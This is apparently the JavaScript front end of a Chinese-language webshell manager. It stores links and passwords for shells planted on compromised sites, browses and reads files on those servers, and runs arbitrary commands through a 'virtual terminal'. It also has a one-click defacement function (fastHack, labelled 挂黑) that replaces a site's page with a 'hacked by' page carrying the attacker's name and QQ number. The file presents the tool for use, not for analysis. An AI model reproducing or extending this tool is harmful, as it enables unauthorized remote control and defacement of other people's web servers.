function isPc() {
    //平台、设备和操作系统    
    var system = {
        win: false,
        mac: false,
        xll: false
    };
    //检测平台    
    var p = navigator.platform;
    system.win = p.indexOf("Win") == 0;
    system.mac = p.indexOf("Mac") == 0;
    system.x11 = (p == "X11") || (p.indexOf("Linux") == 0);
    if (system.win || system.mac || system.xll) {
    	console.log('PC');
        return true;
    } else {
    	console.log('Phone');
        return false;
    }
}

function addLink() {
    var link = $("#link").val();
    var pass = $("#pass").val();
    var load = layer.msg('正在添加...', {
        icon: 16,
        shade: 0.3
    });
    if (!link) {
        layer.open({
            title: '温馨提示',
            content: '请填写连接！',
            icon: 5
        });
        layer.close(load);
        return false;
    }
    if (!pass) {
        layer.open({
            title: '温馨提示',
            content: '请填写密码！',
            icon: 5
        });
        layer.close(load);
        return false;
    }
    $.ajax({
        type: "POST",
        url: "ajax.php?type=add",
        data: {
            link: link,
            pass: pass
        },
        dataType: "json",
        success: function (data) {
            layer.close(load);
            if (data.code == -1) {
                layer.open({
                    title: '温馨提示',
                    content: '添加失败，原因：' + data.data_msg,
                    icon: 5
                });
                layer.close(load);
                return false;
            } else if (data.code == 1) {
                layer.alert('添加成功', {
                    icon: 6,
                    title: '温馨提示'
                }, function (index) {
                    window.location.reload();
                })
                layer.close(load);
                return false;
            }
        },
    })
    return false;
}

function delLink(link) {
    layer.confirm('是否删除此连接？', {
        btn: ['确定', '取消'] //按钮
    }, function () {
        var load = layer.msg('正在删除...', {
            icon: 16,
            shade: 0.3
        });
        if (!link) {
            layer.open({
                title: '温馨提示',
                content: '连接不能为空！',
                icon: 5
            });
            layer.close(load);
            return false;
        }
        $.ajax({
            type: "POST",
            url: "ajax.php?type=del",
            data: {
                link: link
            },
            dataType: "json",
            success: function (data) {
                layer.close(load);
                if (data.code == -1) {
                    layer.open({
                        title: '温馨提示',
                        content: '删除失败，原因：' + data.data_msg,
                        icon: 5
                    });
                    layer.close(load);
                    return false;
                } else if (data.code == 1) {
                    layer.alert('删除成功', {
                        icon: 6,
                        title: '温馨提示'
                    }, function (index) {
                        window.location.reload();
                    })
                    layer.close(load);
                    return false;
                }
            },
        })
    }, function () {
        layer.open({
            title: '温馨提示',
            content: '取消删除！',
            icon: 5
        });
    })
    return false;
}

function fileManage() {
    $("#tablebody").html('');
    $("#path").html('');
    var select = document.getElementById("link").value;
    var load = layer.msg('正在获取文件列表...', {
        icon: 16,
        shade: 0.3
    });
    if (select == "null") {
        layer.open({
            title: '温馨提示',
            content: '请选择连接！',
            icon: 5
        });
        layer.close(load);
        return false;
    }
    arr = document.getElementById("link").value.split("|");
    var link = arr[0];
    var pass = arr[1];
    $.ajax({
        type: "POST",
        url: "ajax.php?type=file",
        data: {
            link: link,
            pass: pass,
            dir: 'dir'
        },
        dataType: "json",
        success: function (data) {
            layer.close(load);
            if (data.code == -1) {
                layer.open({
                    title: '温馨提示',
                    content: '文件列表获取失败，原因：' + data.data_msg,
                    icon: 5
                });
                layer.close(load);
                return false;
            } else if (data.code == 1) {
                layer.msg('文件列表获取完成');
                $("#tablebody").html(data.data_msg);
                $("#path").html(data.data_path);
                layer.close(load);
                $("#top_file").hide();
                $("#tool").show();
                $("#table").show();
                return false;
            }
        },
    })
    return false;
}

function openDir(link, pass, path) {
    var load = layer.msg('正在加载文件列表...', {
        icon: 16,
        shade: 0.3
    });
    if (!link || !pass || !path) {
        layer.open({
            title: '温馨提示',
            content: '页面出错，请刷新！',
            icon: 5
        });
        layer.close(load);
        return false;
    }
    $.ajax({
        type: "POST",
        url: "ajax.php?type=file",
        data: {
            link: link,
            pass: pass,
            dir: path
        },
        dataType: "json",
        success: function (data) {
            layer.close(load);
            if (data.code == -1) {
                layer.open({
                    title: '温馨提示',
                    content: '加载文件列表失败，原因：' + data.data_msg,
                    icon: 5
                });
                layer.close(load);
                return false;
            } else if (data.code == 1) {
                layer.msg('文件列表加载完成');
                $("#tablebody").html(data.data_msg);
                $("#path").html(data.data_path);
                layer.close(load);
                return false;
            }
        },
    })
    return false;
}

function fastHack(link, pass, nick, qq) {
    var load = layer.msg('正在挂黑...', {
        icon: 16,
        shade: 0.3
    });
    $.ajax({
        type: "POST",
        url: "ajax.php?type=hack",
        data: {
            link: link,
            pass: pass,
            nick: nick,
            qq: qq
        },
        dataType: "json",
        success: function (data) {
            layer.close(load);
            if (data.code == -1) {
                layer.open({
                    title: '温馨提示',
                    content: '站点挂黑失败，原因：' + data.data_msg,
                    icon: 5
                });
                layer.close(load);
                return false;
            } else if (data.code == 1) {
                layer.open({
                    title: '温馨提示',
                    content: '站点挂黑成功！',
                    icon: 6
                });
                layer.close(load);
                return false;
            }
        },
    })
}

function readImg(link, pass, path) {
    var load = layer.msg('正在读取图片...', {
        icon: 16,
        shade: 0.3
    });
    if (!link || !pass || !path) {
        layer.open({
            title: '温馨提示',
            content: '页面出错，请刷新！',
            icon: 5
        });
        layer.close(load);
        return false;
    }
    if (isPc()) {
        var width = '890px';
    } else {
        var width = '300px';
    }
    $.ajax({
        type: "POST",
        url: "ajax.php?type=readImg",
        data: {
            link: link,
            pass: pass,
            dir: path
        },
        dataType: "json",
        success: function (data) {
            layer.close(load);
            if (data.code == -1) {
                layer.open({
                    title: '温馨提示',
                    content: '读取图片失败，原因：' + data.data_msg,
                    icon: 5
                });
                layer.close(load);
                return false;
            } else if (data.code == 1) {
                layer.open({
                    type: 1,
                    title: '图片查看',
                    maxmin: false,
                    area: width,
                    offset: '10px',
                    content: '<div width="100%">' + data.data_msg + '</div>'
                });
                layer.close(load);
                return false;
            }
        },
    })
    return false;
}

function readFile(link, pass, path) {
    var load = layer.msg('正在读取文件...', {
        icon: 16,
        shade: 0.3
    });
    if (!link || !pass || !path) {
        layer.open({
            title: '温馨提示',
            content: '页面出错，请刷新！',
            icon: 5
        });
        layer.close(load);
        return false;
    }
    if (isPc()) {
        var width = '890px';
    } else {
        var width = '300px';
    }
    $.ajax({
        type: "POST",
        url: "ajax.php?type=readText",
        data: {
            link: link,
            pass: pass,
            dir: path
        },
        dataType: "json",
        success: function (data) {
            layer.close(load);
            if (data.code == -1) {
                layer.open({
                    title: '温馨提示',
                    content: '读取文件失败，原因：' + data.data_msg,
                    icon: 5
                });
                layer.close(load);
                return false;
            } else if (data.code == 1) {
                layer.open({
                    type: 1,
                    title: '文件查看器',
                    offset: '10px',
                    maxmin: false,
                    area: width,
                    content: data.data_msg
                });
                layer.close(load);
                return false;
            }
        },
    })
    return false;
}

function alertHack() {
    var select = $("#select").val();
    if (select == "null") {
        layer.open({
            title: '温馨提示',
            content: '请选择连接！',
            icon: 5
        });
        return false;
    }
    arr = document.getElementById("link").value.split("|");
    var link = arr[0];
    var pass = arr[1];
    layer.open({
        title: '黑页版权信息',
        content: '<div id="info-body"><input type="text"class="form-control"id="nick"value=""placeholder="名字，如：陌小离"><br><input type="text"class="form-control"id="qq"value=""placeholder="QQ，如：1805765171"></div>',
        btn: ['挂黑', '取消'],
        yes: function (index, layero) {
            var nick = document.getElementById("nick").value;
            var qq = document.getElementById("qq").value;
            if (!nick) {
                layer.msg('请填写名字！', function () {});
                return false;
            }
            if (!qq) {
                layer.msg('请填写QQ！', function () {});
                return false;
            }
            fastHack(link, pass, nick, qq);
        },
        btn2: function (index, layero) {
            layer.msg('您取消了挂黑！', function () {});
            return false;
        },
        cancel: function () {
            layer.msg('您取消了挂黑！', function () {});
            return false;
        }
    });
}

function readZip(link, pass, dir) {
    layer.open({
        title: '温馨提示',
        content: '这部分代码还没写呢！',
        icon: 5
    });
}

function renameFile(link, pass, dir) {
    layer.open({
        title: '温馨提示',
        content: '这部分代码还没写呢！',
        icon: 5
    });
}

function delFile(link, pass, dir) {
    layer.open({
        title: '温馨提示',
        content: '这部分代码还没写呢！',
        icon: 5
    });
}

function colseFileManage() {
    layer.confirm('是否关闭文件管理器？', {
        btn: ['确定', '取消'] //按钮
    }, function () {
        var load = layer.msg('正在关闭...', {
            icon: 16,
            shade: 0.3
        });
        $("#link").val("null");
        $("#top_file").show();
        $("#tool").hide();
        $("#table").hide();
        $("#tablebody").html('');
        $("#path").html('');
        layer.close(load);
        layer.msg('文件管理器已关闭！');
        return false;
    }, function () {
        layer.msg('您取消了关闭！');
        return false;
    })
    return false;
}

function colseTerminal() {
    layer.confirm('是否关闭虚拟终端？', {
        btn: ['确定', '取消'] //按钮
    }, function () {
        var load = layer.msg('正在关闭...', {
            icon: 16,
            shade: 0.3
        });
        $("#link").val("null");
        $("#top_file").show();
        $("#tool").hide();
        $("#table").hide();
        $("#tablebody").html('');
        $("#path").html('');
        layer.close(load);
        layer.msg('虚拟终端已关闭！');
        return false;
    }, function () {
        layer.msg('您取消了关闭！');
        return false;
    })
    return false;
}

function linkTerminal() {
    var select = document.getElementById("link").value;
    var load = layer.msg('正在连接虚拟终端...', {
        icon: 16,
        shade: 0.3
    });
    if (select == "null") {
        layer.open({
            title: '温馨提示',
            content: '请选择连接！',
            icon: 5
        });
        layer.close(load);
        return false;
    }
    arr = document.getElementById("link").value.split("|");
    var link = arr[0];
    var pass = arr[1];
    $.ajax({
        type: "POST",
        url: "ajax.php?type=terminal",
        data: {
            link: link,
            pass: pass,
            cmd: 'Server_info'
        },
        dataType: "json",
        success: function (data) {
            layer.close(load);
            if (data.code == -1) {
                layer.open({
                    title: '温馨提示',
                    content: '虚拟终端连接失败，原因：' + data.data_msg,
                    icon: 5
                });
                layer.close(load);
                return false;
            } else if (data.code == 1) {
                layer.msg('虚拟终端连接成功');
                $("#screen").html(data.data_msg);
                layer.close(load);
                $("#top_file").hide();
                $("#tool").show();
                $("#table").show();
                return false;
            }
        },
    })
    return false;
}

function sendTerminal() {
    var select = document.getElementById("link").value;
    var order = document.getElementById("order").value;
    var load = layer.msg('正在执行代码...', {
        icon: 16,
        shade: 0.3
    });
    if (select == "null") {
        layer.open({
            title: '温馨提示',
            content: '请选择连接！',
            icon: 5
        });
        layer.close(load);
        return false;
    }
    if (!order) {
        layer.open({
            title: '温馨提示',
            content: '请输入命令后执行！',
            icon: 5
        });
        layer.close(load);
        return false;
    }
    $("#screen").html('正在执行命令：'+ order + '...');
    arr = document.getElementById("link").value.split("|");
    var link = arr[0];
    var pass = arr[1];
    $.ajax({
        type: "POST",
        url: "ajax.php?type=terminal",
        data: {
            link: link,
            pass: pass,
            cmd: order
        },
        dataType: "json",
        success: function (data) {
            layer.close(load);
            if (data.code == -1) {
                layer.open({
                    title: '温馨提示',
                    content: '命令执行失败，原因：' + data.data_msg,
                    icon: 5
                });
                layer.close(load);
                $("#order").val("");
                return false;
            } else if (data.code == 1) {
                layer.msg('命令执行成功');
                $("#screen").html(data.data_msg);
                layer.close(load);
                $("#order").val("");
                return false;
            }
        },
    })
    return false;
}
